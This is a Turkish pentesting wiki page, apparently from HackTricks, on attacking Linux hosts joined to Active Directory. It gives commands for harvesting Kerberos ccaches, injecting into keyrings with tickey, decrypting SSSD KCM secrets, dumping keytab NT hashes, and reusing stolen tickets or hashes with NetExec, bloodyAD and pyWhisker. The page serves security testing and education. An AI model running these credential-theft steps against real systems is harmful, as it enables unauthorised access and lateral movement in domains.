# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Bir Linux makinesi Active Directory ortamında da bulunabilir.

AD içindeki bir Linux makinesi **Kerberos materyallerini yerel olarak depolayabilir**: kullanıcı ccache'leri, makine/servis keytab'leri ve SSSD tarafından yönetilen secret'lar. Bu artefact'lar genellikle diğer Kerberos credential'ları gibi yeniden kullanılabilir. Bunların çoğunu okuyabilmek için ticket'ın sahibi olan kullanıcı veya makinede **root** olmanız gerekir.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Enumeration

### Linux üzerinden AD enumeration

Linux üzerinde (veya Windows'ta bash üzerinden) bir AD'ye erişiminiz varsa, AD'yi enumerate etmek için [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) aracını deneyebilirsiniz.

Ayrıca **Linux üzerinden AD'yi enumerate etmenin diğer yollarını** öğrenmek için aşağıdaki sayfaya bakabilirsiniz:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA, temel olarak **Unix** ortamları için Microsoft Windows **Active Directory**'ye yönelik open-source bir **alternatif**tir. Active Directory'ye benzer yönetim için eksiksiz bir **LDAP directory**'yi MIT **Kerberos** Key Distribution Center ile birleştirir. CA ve RA certificate yönetimi için Dogtag **Certificate System** kullanan FreeIPA, smartcard'lar dahil **multi-factor** authentication'ı destekler. Unix authentication süreçleri için SSSD entegre edilmiştir.<sup>[[14]](#references)[[15]](#references)</sup> Bu konu hakkında daha fazla bilgi için:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefact'ları

Ticket'lara erişmeden önce **host'un AD'ye nasıl join edildiğini** ve **Kerberos materyalinin gerçekte nerede depolandığını** belirleyin. Modern Linux host'larda bu işlem genellikle `/tmp` içindeki basit dosyalarla değil, `realmd` + `adcli` + `sssd` ile gerçekleştirilir.<sup>[[10]](#references)</sup>
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Bu, host'un AD'ye güvenip güvenmediğini, SSSD'nin identity veya ticket'ları cache'leyip cache'lemediğini ve **machine/service keytab**'lerinin veya **KCM secrets**'larının abuse için kullanılabilir olup olmadığını hızlıca gösterir.<sup>[[4]](#references)[[10]](#references)</sup>

## Ticket'larla oynama

### Pass The Ticket

Bu sayfada **bir Linux host içinde Kerberos ticket'larını bulabileceğiniz** farklı konumları bulacaksınız. Aşağıdaki sayfada bu CCache ticket formatlarını Kirbi'ye (Windows'ta kullanmanız gereken format) nasıl dönüştürebileceğinizi ve bir PTT attack'ının nasıl gerçekleştirileceğini öğrenebilirsiniz:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

**Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, vb.) ile ilgileniyorsanız, özel olarak hazırlanmış sayfaya göz atın:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### /tmp'den CCACHE ticket reuse

CCACHE dosyaları, **Kerberos credentials**'larını **storing** etmek için kullanılan binary formatlardır. `FILE:/tmp/krb5cc_%{uid}` hâlâ yaygındır, ancak modern Linux deployment'larında `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` veya `KCM:%{uid}` de kullanılır. Ticket'ların `/tmp` içinde bulunduğunu varsaymadan önce **`KRB5CCNAME`** environment variable'ını ve `default_ccache_name` ayarını kontrol edin.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### keyring'den CCACHE ticket yeniden kullanımı

**Bir process'in memory'sinde depolanan Kerberos ticket'ları çıkarılabilir**; özellikle makinenin ptrace protection'ı devre dışı bırakılmışsa (`/proc/sys/kernel/yama/ptrace_scope`). Bu amaçla kullanılabilecek bir tool [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) adresinde bulunur. Bu tool, session'lara injection yaparak ve ticket'ları `/tmp` dizinine dump ederek çıkarma işlemini kolaylaştırır.<sup>[[1]](#references)[[16]](#references)</sup>

Bu tool'u configure etmek ve kullanmak için aşağıdaki adımlar izlenir:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Bu prosedür çeşitli session'lara inject etmeyi deneyecek ve başarıyı, çıkarılan ticket'ları `/tmp` altında `__krb_UID.ccache` adlandırma kuralıyla saklayarak gösterecektir.<sup>[[1]](#references)</sup>

### SSSD KCM'den CCACHE ticket yeniden kullanımı

SSSD, veritabanının bir kopyasını `/var/lib/sss/secrets/secrets.ldb` path'inde tutar. İlgili key, `/var/lib/sss/secrets/.secrets.mkey` path'inde hidden file olarak saklanır. Varsayılan olarak key yalnızca **root** permissions'ına sahipseniz okunabilir.<sup>[[4]](#references)</sup>

**`SSSDKCMExtractor`**'ı --database ve --key parametreleriyle çalıştırmak, veritabanını parse eder ve **secrets'ı decrypt eder**.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Extractor, ham Kerberos JSON payload'larını yazdırır; pass-the-cache/pass-the-ticket işlemlerinden önce bunları kullanılabilir bir ticket cache'e veya başka bir ticket formatına dönüştürün.<sup>[[4]](#references)</sup>

### Hızlı keytab incelemesi
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### /etc/krb5.keytab dosyasından hesapları çıkarma

Root ayrıcalıklarıyla çalışan servisler için gerekli olan servis hesabı anahtarları, **`/etc/krb5.keytab`** dosyalarında güvenli şekilde saklanır. Servisler için parola işlevi gören bu anahtarların gizliliği kesinlikle korunmalıdır.<sup>[[5]](#references)</sup>

Keytab dosyasının içeriğini incelemek için **`klist`** kullanılabilir. Linux'ta `klist -k -K -e`; principal'ları, anahtar sürüm numaralarını, şifreleme türlerini ve ham anahtar materyalini yazdırır. Anahtar türü **23 / RC4-HMAC** ise anahtar değeri aynı zamanda ilgili principal'ın **NT hash** değeridir.<sup>[[6]](#references)[[17]](#references)</sup>
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Linux kullanıcıları için **`KeyTabExtract`**, NTLM hash reuse amacıyla kullanılabilecek RC4 HMAC hash'ini çıkarma işlevi sunar. Bunun yalnızca keytab hâlâ **etype 23 / RC4-HMAC** materyali içeriyorsa işe yaradığını unutmayın. **AES-only** ortamlarda yeniden kullanılabilir bir NT hash elde edemeyebilirsiniz; ancak Kerberos üzerinden keytab ile doğrudan authentication yapabilirsiniz.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOS'ta, **`bifrost`**, keytab dosyası analizi için bir araç görevi görür.<sup>[[8]](#references)</sup>
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Ayıklanan hesap ve hash bilgileri kullanılarak, **`NetExec`** gibi araçlarla sunuculara bağlantılar kurulabilir.<sup>[[9]](#references)</sup>
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```
### `/etc/krb5.keytab` içindeki machine account'u yeniden kullanma

`realmd`/`adcli`/`sssd` ile join edilmiş sistemlerde `/etc/krb5.keytab` genellikle **computer account** ve bir veya daha fazla **host/service principal** içerir. **root** erişiminiz varsa bunu doğrudan `dump` etmeyin: `klist -k` tarafından listelenen principal'lardan birini kullanarak TGT talep edin ve Linux host'un kendisi olarak işlem yapın.<sup>[[10]](#references)</sup>
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Bu, özellikle **computer object** öğesinin AD'de yetki devredilmiş haklara sahip olduğu veya ana bilgisayarın **gMSA** gibi diğer secret'ları almasına izin verildiği durumlarda oldukça kullanışlıdır.<sup>[[13]](#references)</sup>

### Çalınan Kerberos materyalini Linux-first AD araçlarıyla yeniden kullanma

Geçerli bir `ccache` veya kullanılabilir bir keytab'a sahip olduğunuzda, her şeyi önce Windows formatlarına dönüştürmeden AD üzerinde **doğrudan Linux'tan** işlem yapabilirsiniz. Birçok modern araç, `KRB5CCNAME` / Kerberos kimlik doğrulamasını native olarak destekler.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Bu, **Linux post-exploitation** ile **AD object abuse** arasında iyi bir köprüdür. Object-level abuse yollarının kendisi için şunlara bakın:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefact'leri

Güncel Linux deployment'ları **Managed Service Account**'ları doğrudan AD'den kullanabilir. Pratikte bu, bir Linux sunucusunu compromise ettikten sonra yalnızca host keytab'ını değil, aynı zamanda bir gMSA'dan oluşturulan **service-specific keytab**'larını da bulabileceğiniz anlamına gelir. İncelenecek yaygın konumlar arasında `/etc/gmsad.conf`, deployment'a özgü config dosyaları ve `/etc` altındaki ek `*.keytab` dosyaları bulunur.<sup>[[2]](#references)[[13]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Bu, herhangi bir Windows endpoint'e dokunmadan SPN'lere bağlı gMSA için yeniden kullanılabilir bir Kerberos identity sağlar.<sup>[[13]](#references)</sup> AD'de daha yüksek privileges elde ettikten sonra **domain-side** gMSA/dMSA abuse için şuraya bakın:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Kerberos'a nasıl saldırılır?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Managed service account ile AD'ye erişim – RHEL sistemlerini doğrudan Active Directory ile entegre etme](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Kerberos environment variables – MIT Kerberos Documentation](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – MIT Kerberos Documentation](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Microsoft Windows tarafından kullanılan RC4-HMAC Kerberos Encryption Types](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Kerberos kullanımı | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Identity Domains keşfetme ve bunlara katılma | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [bloodyAD User Guide](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Hakkında | FreeIPA documentation](https://www.freeipa.org/About.html)
- [15] [FreeIPA 4.11.0 sürüm notları](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – The Linux Kernel documentation](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – MIT Kerberos Documentation](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
